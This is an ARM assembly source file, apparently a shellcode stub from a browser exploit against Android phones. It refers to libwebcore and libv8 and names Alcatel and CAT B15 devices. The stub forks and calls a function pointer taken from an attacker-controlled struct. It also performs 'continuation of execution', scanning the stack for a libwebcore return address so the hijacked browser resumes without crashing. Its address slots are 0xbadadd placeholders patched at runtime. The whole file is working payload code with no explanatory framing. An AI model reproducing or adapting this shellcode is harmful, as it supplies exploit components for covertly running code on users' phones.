.globl _start

.section .text	

_start:
	.code 32
	push {r0-r7, lr}
	/*bkpt*/
	/* Need to preserve r6 */
	adr r4, structfn
	ldr r4, [r4]
	ldr r5, [r4]
	cmp r5, #0
	beq coe
	ldr r7, [r4, #0x4]
	cmp r7, #0
	beq callfn

forkingcall:			/* fok'n call */
	mov	r7, #2
	svc	0
	str 	r0, [r4, #0x1c] /* return pid */
	cmp	r0, #0
	bne	cleanexit

callfn:
	ldr r0, [r4, #0x8]
	ldr r1, [r4, #0xc]
	ldr r2, [r4, #0x10]
	ldr r3, [r4, #0x14]
	ldr r4, [r4, #0x18]
	blx r5
	
	adr r4, structfn
	ldr r4, [r4]
	str r0, [r4, #0x1c]
	
	b cleanexit
	
coe:
	/* Continuation of execution */
	/* precondition: */
	/* r6-r12 preserved */
	adr r5, badadd07
	ldr r5, [r5]
	str r5, [r4]            /* write 0xbadadd07 to structfn[0] (checksum)*/
	adr r0, stackbuf
	ldr r0, [r0]
	adr r4, webcorestart
	ldr r4, [r4]            /* r4 <- libwebcore start address */
	adr r5, webcoreend
	ldr r5, [r5]            /* r5 <- libwebcore end address */
	
	ldr sp, [r0]            /* stack address */

findframe:	
	sub sp, sp, #0x4        /* start search from stackaddress-4 */
	                        /* decrement at each iteration */
	ldr r0, [sp]
	cmp r0, r4
	blo findframe           /* if stackword <= webcore start address do another loop */
	cmp r0, r5
	bhs findframe           /* if stackword >= webcore end address do another loop */
	
	add sp, sp, #0x20       /* add default stack size (0x1c) + 0x4 to compensate */
coe_8:	
	adr r4, v8start
	ldr r4, [r4]            /* r4 <- libv8 (if it exists) start address */
	adr r5, v8end
	ldr r5, [r5]            /* r5 <- libv8 (if it exists) end address */

	ldr r0, [sp, #0x8]
	cmp r0, r4
	blo coe_12              /* if stackword <= v8/webcore start address try 12 */
	cmp r0, r5
	bhs coe_12              /* if stackword >= v8/webcore end address try 12 */
	
	adr r0, altcoeflag
	ldr r0, [r0]
	cmp r0, #1
	beq alt_coe
	
	pop {r4, r5, pc}          /* <--- REGULAR COE */
	
alt_coe:	
	adr r11, structfn         /* <--- ALTERNATE COE (seen in Alcatel and CAT B15) */
	ldr r11, [r11]
	pop {r4, r5}
	ldr r6, [r4, #0xa74]
	pop {pc}

coe_12:
	ldr r0, [sp, #0xc]
	cmp r0, r4
	blo coe_16              /* if stackword <= webcore start address try 16 */
	cmp r0, r5
	bhs coe_16              /* if stackword >= webcore end address try 16 */
	
	pop {r4, r5, r6, pc}
coe_16:
	pop {r4, r5, r6, r7, pc}
	
cleanexit:
	pop {r0-r7, pc}

        .align 4
stackbuf:	.word 0xbadadd00
webcorestart:	.word 0xbadadd01
webcoreend:	.word 0xbadadd02
v8start:	.word 0xbadadd03
v8end:		.word 0xbadadd04
structfn:	.word 0xbadadd05
altcoeflag:	.word 0xbadadd06
badadd07:	.word 0xbadadd07
eof:		.word 0xbadade0f
